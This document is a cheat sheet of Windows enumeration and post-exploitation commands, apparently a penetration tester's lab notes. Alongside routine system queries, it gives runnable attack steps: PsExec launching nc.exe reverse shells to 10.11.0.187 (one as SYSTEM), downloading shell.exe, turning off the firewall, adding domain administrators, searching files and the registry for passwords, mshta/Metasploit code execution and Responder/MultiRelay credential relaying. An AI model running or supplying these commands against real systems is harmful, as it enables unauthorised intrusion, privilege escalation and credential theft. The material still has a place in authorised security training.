# Windows Enumeration
======

## System
------
#### List System Info
systeminfo
#### List System Info (shortened)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
#### Hostname
hostname
#### OS Version
ver

## Users
------
#### Prints username
echo %username% 
#### Display All User Info
whoami /all 
#### Env Variables Beginning with "U"
SET U All
#### Add User
net user <user> <password> /add
#### Add User to Group
net localgroup administrators /add <user>
#### Add User to Domain Group
net group "HR Admins" myUser /add /domain

## Network
------
#### Network Interfaces
ipconfig /all  
#### Routing Table
route print
#### ARP Table
arp -A 
#### All Open Connections
netstat -ano
#### All TCP Connections
netstat -ano -p TCP
#### Firewall State
netsh firewall show state firewall state 
#### Firewall Config
netsh firewall show config firewall config 
#### Firewall State
netsh advfirewall show currentprofile
#### Firewall Config
netsh advfirewall firewall show rule name=all
#### Turn off Firewall
netsh advfirewall set allprofiles state off
#### List Computers In Current Domain
net view
#### List Users
net users 
#### List User Info
net user user1 
#### Unk
net config

## Processes, Services, Drivers
------
#### Scheduled Tasks
schtasks /query /fo LIST /v 
#### Delete Scheduled Task
SCHTASKS /Delete /TN SERVERQR /F
#### Create Scheduled Task
SCHTASKS /create /tn SERVERQR /sc DAILY /mo 365 /tr "cmd /c echo,Y|cacls C:\Windows\Fonts\*.exe /G everyone:f"
#### Processes + Services
tasklist /SVC
#### Terminate Process
taskkill /PID pid
#### Kill Process forcefully by imagename
taskkill /F /IM wscript.exe
#### Running Services
net start
#### Query Service Config
sc qc [service_name]
#### Service Info
sc queryex state= 
#### List Drivers
DRIVERQUERY
#### List Drivers
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
#### Get Loaded Driver Version Numbers
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion,Manufacturer | ?{$_.DeviceName -like "*XBox*"}

## Searching Files
------
#### PDF Search
dir /a /s /b c:\'.pdf' 
#### Search for Patches
dir /a /b c:\windows\kb' 
#### Search for Passwords
findstr /si password *.txt *.xml *.xls *.ini *.infrecursively from current directory 
#### Search for filenames with password
dir /s *pass* == *cred* == *vnc* == *.config*
#### Search registry for password
reg query HKLM /f password /t REG_SZ /s | reg query HKCU /f password /t REG_SZ /s | reg query HKLM /v password /t REG_SZ /s 
#### View Remote Files
dir \\IP.ADD.RE.SS\C$
#### List Mounted Drives
mountvol
#### Search for AlwaysInstallElevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
#### Search for AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

## Misc
------
#### Enum Domain Info
dsquery
#### Run As Different User
runas /u:Administrator cmd.exe
#### Copy output to Clipboard
| clip
#### Check File Permissions
cacls <Program File>
#### Check File Permissions
icacls
#### List Dirs and Owners
dir /q 
#### Open Webpage
explorer.exe http://10.11.0.187/index.html
#### Installed Updates (Hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn
#### Kill Processes with Known ExecutablePath
wmic process where ExecutablePath='C:\\Windows\Fonts\\svhost.exe' delete

## Powershell
------
#### Download Page
powershell -command "& {&'wget' http://10.11.0.187/shell.exe -OutFile shell.exe}"  
#### Runas Equivalent
PsExec.exe /accepteula  -u <user> -p <pass> nc.exe -nv 10.11.0.187 8888 -e cmd.exe 
#### Get System Privileges
PsExec.exe /accepteula -i -d -s nc.exe -nv 10.11.0.187 8889 -e cmd.exe
#### Wget Equivalent
Invoke-WebRequest -uri <URL> -OutFile C:\Windows\TEMP\outfile.txt

## System Internal Suite Notes
------
#### Accept EULA
accesschk.exe /accepteula 
#### Find Files With Insecure Permissions
accesschk.exe -uws "Everyone" "C:\Program Files"
#### Check Auto Runs
Autorunsc.exe /accepteula
#### Check File Privs
C:\Users\Public\accesschk64.exe /accepteula * 
#### Check Process Privs
accesschk.exe -vqp *
#### Find Permissions
accesschk.exe -uwdqs users c:\ 
#### Find Permissions
accesschk.exe -uwdqs "Authenticated Users" c:\ 
#### Find Permissions
accesschk.exe -uwqs users c:\*.* 
#### Find Permissions
accesschk.exe -uwqs "Authenticated Users" c:\*.* 
#### Find Permissions
cacls "c:\Program Files" /T | findstr Users
#### Stop network traffic to domain
echo 127.0.0.1 my.crypto-pool.info >> %WINDIR%\system32\drivers\etc\hosts
#### Take Ownership of a File
takeown /F file.txt
#### MSHTA.exe Code Execution
Start metasploit server (exploit/windows/misc/hta_server).  Then, run "mshta.exe //<ip-addr>/random.hta" on the host machine.
#### Temporary Folder (System)
C:\Windows\Temp
#### Temporary Folder (User)
%USERPROFILE%\AppData\Local\

## WMIC
------
#### List Groups
wmic group list brief
#### List Hotfixes
wmic qfe list brief
#### Desktop Information
wmic desktop list brief
#### CD Information
wmic cdrom list brief
#### NIC Information
wmic nic list brief
#### List Installed Programs (lists only installed by Windows Installer)
wmic product get name,version,vendor
#### Control Output of wmic Command
wmic process get name,processid
#### Start a Program
wmic /node:localhost process call create 'C:\file.exe'
#### Close a Program
wmic process where processid="1000" call terminate
#### Close a Remote Program
wmic /node:localhost /user:rambo /password:FirstBl00dPart3 process where name="paint.exe" call terminate
#### Turn on RemoteDesktop
-wmic /node:"servername" /user:"user@domain" /password: "password" RDToggle where ServerName="server name" call SetAllowTSConnections 1
#### LogicalDisk Free Space
wmic /Node:%%A LogicalDisk Where DriveType="3" Get DeviceID,FileSystem,FreeSpace,Size /Format:csv MORE /E +2 >> SRVSPACE.CSV
#### List all Shares
wmic logicaldisk get name,providername
#### List all Shares
new view \\\\COMPUTERNAME
#### Mount a CIFS Share
net use Z: \\HOSTNAME\SHARE /PERSISTENT:YES
#### List Startup Processes
wmic startup get caption,command,user
#### Run wmic Remotely
wmic /node:remotehost /username:rambo /password:FirstBl00dPart3 service where name="LanManServer" get caption,name,status,started

## Lolbas
------
#### Make HTTP Request (Download a file)
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
#### Open remote Office document
"C:\Program Files\Microsoft Office\Root\Office16\protocolhandler.exe" "ms-word:nft|u|https://url/doc.dotm"
#### List Shadow Copies
+ vssadmin list shadows
+  vssadmin list shadowstorage

#### List all autorun programs in XML format
autorunsc.exe -x > autoruns.xml
#### List all non-microsoft autoruns in CSV format
autorunsc.exe -m -v 
#### List audit policy
auditpol /get /category:*
#### Turn on an audit policy
auditpol /set /subcategory:"Logon" /success:enable

## Domain Joined
------
#### Get Domain Users
net user /domain
#### Get Domain Groups
net group /domain
#### Get Current Domain
+ $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  $pdc = ($domain.PdcRoleOwner).Name
+  $dn = $domain.Name.Replace('.',',DC=')
+  $searchstr = "ldap://" + $pdc + "/Dc=" + $dn 
#### Create Domain User
net users h00p password /add /domain
net group "Domain Admins" h00p /add /domain

#### Search AD
$ldapsearch = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchstr); $objDomain = New-Object System.DirectoryServices.DirectoryEntry; $ldapsearch.SearchRoot = $objDomain; $ldapsearch.filter="samAccountType=805306368"; $ldapsearch.FindAll();
#### Find Logged On Users
Get-NetLoggedon -ComputerName foobar
#### Find Logged On Sessions
Get-NetSessions -ComputerName dc02


## Responder/Relay
#### Invoke MultiRelay (relays if an incoming connection is recieved)
python MultiRelay.py -t 192.168.11.17 -u ALL
#### Determine if target is vulnerable
python RunFinger.py -i 192.168.0.0/24
#### Start Responder
python Responder.py -I eth0

